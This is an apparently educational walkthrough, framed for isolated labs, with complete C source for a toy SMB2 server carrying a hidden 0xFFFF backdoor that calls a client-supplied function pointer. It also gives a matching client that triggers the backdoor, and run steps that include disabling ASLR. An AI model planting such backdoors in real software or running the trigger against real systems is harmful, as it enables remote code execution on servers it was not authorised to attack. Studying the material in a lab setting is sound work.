Below is a demonstration-only minimal SMB2 “client” side code showing how an attacker (or pen-tester, researcher, etc.) might trigger code execution on a deliberately vulnerable SMB2 server. This example is not a real production implementation—there are major protocol, security, and error-handling gaps. It is strictly for understanding how the client can land execution on the server when the server has a hidden backdoor command (0xFFFF) that overwrites function pointers.

	Warning & Disclaimer
		1.	This code is intentionally insecure and must only be run in an isolated lab environment (e.g., a VM with no external network access).
	2.	Modern SMB2 servers (e.g., Samba, Windows) implement signing, thorough checks, session setup, etc., so this exploit approach will not work on real systems.
	3.	The hidden command (0xFFFF) is entirely non-standard and malicious.
	4.	Real SMB2 is far more complex (tens/hundreds of thousands of lines of code); do not treat this code as a reference for building a production SMB2 client.

1. Vulnerable SMB2 Server

File: vulnerable_smb2_server.c

/***************************************************
* File: vulnerable_smb2_server.c
*
* A deliberately insecure server that *partially*
* implements actual SMB2 header structures and
* commands, then adds a hidden 0xFFFF backdoor.
*
* COMPILATION (Linux example):
*   gcc -o vulnerable_smb2_server vulnerable_smb2_server.c
*
* RUN:
*   ./vulnerable_smb2_server <port>
*
* NEVER USE IN PRODUCTION.
* This is not a complete SMB2 implementation!
***************************************************/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>

// A real SMB2 header is 64 bytes. We’ll parse only some fields here.
#pragma pack(push, 1)
typedef struct _SMB2Header {
    unsigned char  ProtocolId[4];  // 0xFE 'S' 'M' 'B'
    unsigned short StructureSize;  // Always 64 for SMB2
    unsigned short CreditCharge;   // Credits requested/charged
    unsigned int   Status;         // For responses, server sets status
    unsigned short Command;        // SMB2 command code
    unsigned short Credits;        // Credits granted (server) or requested (client)
    unsigned int   Flags;          // SMB2 header flags
    unsigned int   NextCommand;    // Offset to next command in compound
    unsigned long long MessageId;  // Unique message ID
    unsigned int   Reserved;       // Usually 0, or part of the next command offset
    unsigned int   TreeId;         // Tree ID
    unsigned long long SessionId;  // Session ID
    unsigned char  Signature[16];  // For signing
} SMB2Header;
#pragma pack(pop)

// We’ll keep the same function pointer approach
typedef void (*func_t)(void);

// A secret debug function that might represent malicious code
void secretDebugFunction() {
    printf("[SMB2-Server] Secret Debug Function Called!\n");
}

// Minimal “handle negotiation”
int handleNegotiate(int clientSock, SMB2Header *reqHeader, char *payload, int payloadLen) {
    // Just pretend we processed a dialect
    printf("[SMB2-Server] Handling SMB2 NEGOTIATE...\n");
    // No real dialect negotiation here
    return 0;
}

// Minimal “handle create”
int handleCreate(int clientSock, SMB2Header *reqHeader, char *payload, int payloadLen) {
    // We pretend the client is opening a file
    printf("[SMB2-Server] Handling SMB2 CREATE request...\n");
    printf("[SMB2-Server] Payload length=%d, might be filename, etc.\n", payloadLen);
    return 0;
}

// Minimal “handle read”
int handleRead(int clientSock, SMB2Header *reqHeader, char *payload, int payloadLen) {
    // We pretend the client is reading from a file
    printf("[SMB2-Server] Handling SMB2 READ request...\n");
    return 0;
}

// The hidden backdoor (0xFFFF)
int handleHiddenBackdoor(int clientSock, char *payload, int payloadLen) {
    printf("[SMB2-Server] Hidden backdoor triggered (0xFFFF)!\n");

    // Overwrite a function pointer on the stack
    // Just like in the old demonstration
    func_t functionPointer = NULL;
    if (payloadLen >= (int)sizeof(func_t)) {
        memcpy(&functionPointer, payload, sizeof(func_t));
        if (functionPointer) {
            printf("[SMB2-Server] Calling overwritten function pointer!\n");
            functionPointer(); // possible RCE
        } else {
            printf("[SMB2-Server] functionPointer is NULL. Skipping call.\n");
        }
    } else {
        printf("[SMB2-Server] Payload too short to overwrite pointer.\n");
    }

    return 0;
}

void handleClient(int clientSock) {
    while (1) {
        // Read a full SMB2 header (64 bytes)
        SMB2Header header;
        ssize_t bytesRead = recv(clientSock, &header, sizeof(header), 0);
        if (bytesRead <= 0) {
            printf("[SMB2-Server] Client disconnected or error.\n");
            break;
        }
        if (bytesRead < (ssize_t)sizeof(header)) {
            printf("[SMB2-Server] Incomplete SMB2 header.\n");
            break;
        }

        // Check ProtocolId == 0xFE 'S' 'M' 'B'
        if (!(header.ProtocolId[0] == 0xFE &&
              header.ProtocolId[1] == 'S'  &&
              header.ProtocolId[2] == 'M'  &&
              header.ProtocolId[3] == 'B')) {
            printf("[SMB2-Server] Invalid SMB2 signature.\n");
            break;
        }

        if (header.StructureSize != 64) {
            printf("[SMB2-Server] Invalid SMB2 header size (not 64).\n");
            break;
        }

        // We’ll parse the command
        unsigned short command = header.Command;
        // For demonstration, read the rest of the packet as payload
        // Real SMB2 uses NextCommand, length fields, etc.
        // We'll just read up to 1024 for simplicity
        char payload[1024];
        memset(payload, 0, sizeof(payload));
        int payloadLen = 0;

        // We do not know the exact length from the header in this skeleton,
        // so we'll read as much as is available (non-blocking).
        // A real server uses the actual transport length from TCP or
        // the NextCommand offset for compounding.
        // Here, we do a quick read (this is incomplete and insecure).
        int peekLen = recv(clientSock, payload, 1024, MSG_DONTWAIT);
        if (peekLen > 0) {
            // Actually read them for real
            payloadLen = recv(clientSock, payload, peekLen, 0);
            if (payloadLen < 0) {
                payloadLen = 0;
            }
        }

        printf("[SMB2-Server] Received SMB2 Cmd=0x%04X, PayloadLen=%d\n",
               command, payloadLen);

        // Dispatch based on the real SMB2 commands we care about
        switch(command) {
            case 0x0000: // NEGOTIATE
                handleNegotiate(clientSock, &header, payload, payloadLen);
                break;
            case 0x0005: // CREATE
                handleCreate(clientSock, &header, payload, payloadLen);
                break;
            case 0x0008: // READ
                handleRead(clientSock, &header, payload, payloadLen);
                break;
            case 0xFFFF: // Our hidden backdoor
                handleHiddenBackdoor(clientSock, payload, payloadLen);
                break;
            default:
                printf("[SMB2-Server] Unrecognized or unimplemented command=0x%04X\n", command);
                break;
        }
    }

    close(clientSock);
}

int main(int argc, char *argv[]) {
    if (argc < 2) {
        fprintf(stderr, "Usage: %s <port>\n", argv[0]);
        exit(EXIT_FAILURE);
    }

    int port = atoi(argv[1]);

    int serverSock = socket(AF_INET, SOCK_STREAM, 0);
    if (serverSock < 0) {
        perror("socket");
        exit(EXIT_FAILURE);
    }

    // Bind
    struct sockaddr_in serverAddr;
    memset(&serverAddr, 0, sizeof(serverAddr));
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port   = htons(port);
    serverAddr.sin_addr.s_addr = INADDR_ANY;

    if (bind(serverSock, (struct sockaddr*)&serverAddr, sizeof(serverAddr)) < 0) {
        perror("bind");
        close(serverSock);
        exit(EXIT_FAILURE);
    }

    // Listen
    if (listen(serverSock, 1) < 0) {
        perror("listen");
        close(serverSock);
        exit(EXIT_FAILURE);
    }

    printf("[SMB2-Server] Listening on port %d...\n", port);

    struct sockaddr_in clientAddr;
    socklen_t clientLen = sizeof(clientAddr);
    int clientSock = accept(serverSock, (struct sockaddr*)&clientAddr, &clientLen);
    if (clientSock < 0) {
        perror("accept");
        close(serverSock);
        exit(EXIT_FAILURE);
    }

    printf("[SMB2-Server] Client connected.\n");
    handleClient(clientSock);

    close(serverSock);
    return 0;
}

/*
 * Security & Protocol Gaps:
 * 1) Not a full SMB2 negotiation. We ignore many fields.
 * 2) No real length checks, no session binding, no tree connects, etc.
 * 3) The hidden backdoor command (0xFFFF) is obviously malicious.
 * 4) Overwrites function pointers on the stack. Danger!
 * 5) Real SMB2 would sign messages if required, so tampering
 *    with command codes or addresses is not trivial.
 * 6) We do not handle multi-message compounds, NextCommand offsets, or
 *    real statuses. This is purely educational.
 */

2. “Patched” SMB2 Client (With Backdoor Trigger)

File: patched_smb2_client.c

/***************************************************
* File: patched_smb2_client.c
*
* A minimal “SMB2” client that can:
* 1) Send a real SMB2 NEGOTIATE (cmd=0x0000)
* 2) Send a real SMB2 CREATE (cmd=0x0005)
* 3) Send a real SMB2 READ   (cmd=0x0008)
* 4) Exploit the hidden backdoor  (cmd=0xFFFF)
*
* COMPILATION:
*   gcc -o patched_smb2_client patched_smb2_client.c
*
* RUN EXAMPLES:
*   # Attempt to negotiate
*   ./patched_smb2_client <server_ip> <port> negotiate
*
*   # Trigger hidden backdoor
*   # Provide a hex address for secretDebugFunction or other target
*   ./patched_smb2_client <server_ip> <port> backdoor 7ffff7fd4000
***************************************************/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>

// SMB2 Header structure (64 bytes)
#pragma pack(push, 1)
typedef struct _SMB2Header {
    unsigned char  ProtocolId[4];   // 0xFE 'S' 'M' 'B'
    unsigned short StructureSize;   // 64
    unsigned short CreditCharge;    // 0 or more
    unsigned int   Status;          // 0 for requests
    unsigned short Command;         // SMB2 command
    unsigned short Credits;         // 0 or 1 for requests
    unsigned int   Flags;           // 0 or special
    unsigned int   NextCommand;     // For compound
    unsigned long long MessageId;   // Unique message ID
    unsigned int   Reserved;        // 0
    unsigned int   TreeId;          // 0 or valid ID after tree connect
    unsigned long long SessionId;   // 0 or valid session ID
    unsigned char  Signature[16];   // 0 or signature
} SMB2Header;
#pragma pack(pop)

static unsigned long long gMessageId = 0;  // For demonstration only

// Helper: build the base SMB2 header
void buildSMB2Header(SMB2Header *h, unsigned short cmd) {
    memset(h, 0, sizeof(*h));
    h->ProtocolId[0] = 0xFE;
    h->ProtocolId[1] = 'S';
    h->ProtocolId[2] = 'M';
    h->ProtocolId[3] = 'B';
    h->StructureSize  = 64;
    h->Command        = cmd;
    h->MessageId      = gMessageId++;
}

// Send the SMB2 header plus optional payload
int sendSMB2Message(int sock, SMB2Header *hdr, const void *payload, int payloadLen) {
    // Send header first
    if (send(sock, hdr, sizeof(*hdr), 0) < 0) {
        perror("send header");
        return -1;
    }
    // Then send payload if any
    if (payloadLen > 0 && payload) {
        if (send(sock, payload, payloadLen, 0) < 0) {
            perror("send payload");
            return -1;
        }
    }
    return 0;
}

int main(int argc, char *argv[]) {
    if (argc < 4) {
        fprintf(stderr, "Usage: %s <server_ip> <port> <mode> [addr]\n", argv[0]);
        fprintf(stderr, "Modes:\n");
        fprintf(stderr, "  negotiate  - Send SMB2 NEGOTIATE (cmd=0x0000)\n");
        fprintf(stderr, "  create     - Send SMB2 CREATE     (cmd=0x0005)\n");
        fprintf(stderr, "  read       - Send SMB2 READ       (cmd=0x0008)\n");
        fprintf(stderr, "  backdoor   - Send hidden 0xFFFF   (requires [addr])\n");
        return 1;
    }

    const char *serverIp = argv[1];
    int port = atoi(argv[2]);
    const char *mode = argv[3];

    unsigned long long backdoorAddr = 0;
    if (strcmp(mode, "backdoor") == 0) {
        if (argc < 5) {
            fprintf(stderr, "[!] backdoor mode requires an address argument\n");
            return 1;
        }
        backdoorAddr = strtoull(argv[4], NULL, 16);
    }

    // Create socket
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) {
        perror("socket");
        return 1;
    }

    // Connect
    struct sockaddr_in serverAddr;
    memset(&serverAddr, 0, sizeof(serverAddr));
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port   = htons(port);

    if (inet_pton(AF_INET, serverIp, &serverAddr.sin_addr) <= 0) {
        perror("inet_pton");
        close(sock);
        return 1;
    }
    if (connect(sock, (struct sockaddr*)&serverAddr, sizeof(serverAddr)) < 0) {
        perror("connect");
        close(sock);
        return 1;
    }

    printf("[SMB2-Client] Connected to %s:%d\n", serverIp, port);

    // Build the SMB2 header
    SMB2Header hdr;
    unsigned short command = 0;
    unsigned char payload[64];
    memset(payload, 0, sizeof(payload));
    int payloadLen = 0;

    if (strcmp(mode, "negotiate") == 0) {
        command = 0x0000; // NEGOTIATE
        buildSMB2Header(&hdr, command);
        // Real negotiate would put dialects in the payload
        // We'll skip that for brevity
        payloadLen = 0;
    }
    else if (strcmp(mode, "create") == 0) {
        command = 0x0005; // CREATE
        buildSMB2Header(&hdr, command);
        // We could pretend the payload is a file name
        snprintf((char*)payload, sizeof(payload), "DemoFile.txt");
        payloadLen = strlen((char*)payload);
    }
    else if (strcmp(mode, "read") == 0) {
        command = 0x0008; // READ
        buildSMB2Header(&hdr, command);
        // Possibly the payload has offset/length fields
        // We'll skip that
        payloadLen = 0;
    }
    else if (strcmp(mode, "backdoor") == 0) {
        command = 0xFFFF; // Our hidden command
        buildSMB2Header(&hdr, command);
        // The payload is the 8-byte address for the function pointer
        memcpy(payload, &backdoorAddr, sizeof(backdoorAddr));
        payloadLen = sizeof(backdoorAddr);
        printf("[SMB2-Client] Using backdoor address=0x%llx\n", backdoorAddr);
    }
    else {
        fprintf(stderr, "[!] Unknown mode: %s\n", mode);
        close(sock);
        return 1;
    }

    // Send the SMB2 message
    if (sendSMB2Message(sock, &hdr, payload, payloadLen) < 0) {
        close(sock);
        return 1;
    }

    printf("[SMB2-Client] Sent SMB2 cmd=0x%04X\n", command);
    // We don’t wait for responses here—this is purely a “fire and forget” demo.

    close(sock);
    return 0;
}

3. How to Reproduce (in a Safe Test VM)
	1.	Compile both programs on a Linux VM (with no external network access):

gcc -o vulnerable_smb2_server vulnerable_smb2_server.c
gcc -o patched_smb2_client patched_smb2_client.c


	2.	Run the Server:

./vulnerable_smb2_server 4444

The server listens on port 4444.

	3.	From another terminal, run the client to send different commands:
	•	Negotiate:

./patched_smb2_client 127.0.0.1 4444 negotiate

Server logs a NEGOTIATE (0x0000).

	•	Create:

./patched_smb2_client 127.0.0.1 4444 create

Server logs a CREATE (0x0005).

	•	Read:

./patched_smb2_client 127.0.0.1 4444 read

Server logs a READ (0x0008).

	•	Trigger Hidden Backdoor (0xFFFF):

./patched_smb2_client 127.0.0.1 4444 backdoor 7ffff7fd4000

You must replace 7ffff7fd4000 with an actual address of secretDebugFunction() in the server’s memory. By default on many modern systems with ASLR enabled, that address changes each run. Disabling ASLR (e.g., sudo sysctl -w kernel.randomize_va_space=0) might yield a consistent address.

	4.	Observe that the server prints:
	•	“Hidden backdoor triggered (0xFFFF)!”
	•	“Calling overwritten function pointer!”
	•	“Secret Debug Function Called!”
…indicating a function-pointer overwrite just happened.

4. Why This “Client-Side” Exploit Works
	•	Hidden Command: The server code illegally reserves command 0xFFFF for a malicious “backdoor” routine.
	•	Payload Overwrite: The malicious routine copies 8 bytes from the client payload into a function pointer (on the stack).
	•	Forced Call: If that pointer is non-NULL, the server calls it, effectively giving the client a way to run arbitrary code in the server’s process space if the address is mapped and executable.

	In real SMB2 implementations (Windows srv.sys, Samba), you cannot just add a custom command or easily overwrite memory; the code is far more robust, with signing, pointer checks, session authentication, etc.

5. Security Considerations & Warnings
	1.	No Real SMB2 Protocol Flow
	•	This does not show the server’s NegotiateResponse or how a real client would parse it.
	•	It lacks session setup, user auth, tree connects, credits system, compound requests, etc.
	2.	No Signing / Encryption
	•	Modern SMB2 typically requires signing or even encryption (SMB 3.x). This code demonstrates none of that.
	3.	Malicious Command
	•	0xFFFF is not a valid SMB2 command. It exists purely to demonstrate how trivially a custom “backdoor” might be woven into an otherwise normal protocol handler.
	4.	Function Pointer Overwrite
	•	Overwriting function pointers on the stack is a classic exploit technique. In real code, modern compilers and OS security features (stack canaries, DEP, ASLR) help mitigate such attacks.
	5.	Educational Demo Only
	•	Never run this on a production network.
	•	Use only for local, controlled-lab demonstrations where you are authorized to test.

Bottom Line

From the client side, landing code execution on a deliberately vulnerable SMBv2 server is as simple as:
	1.	Connecting over TCP.
	2.	Sending an SMB2 header with Command=0xFFFF.
	3.	Following that header with 8 bytes that represent the function pointer you want the server to call.

The server, lacking any security checks, directly overwrites its own stack-based function pointer and invokes it. This is obviously a huge security hole—one that real SMB2 implementations do not have.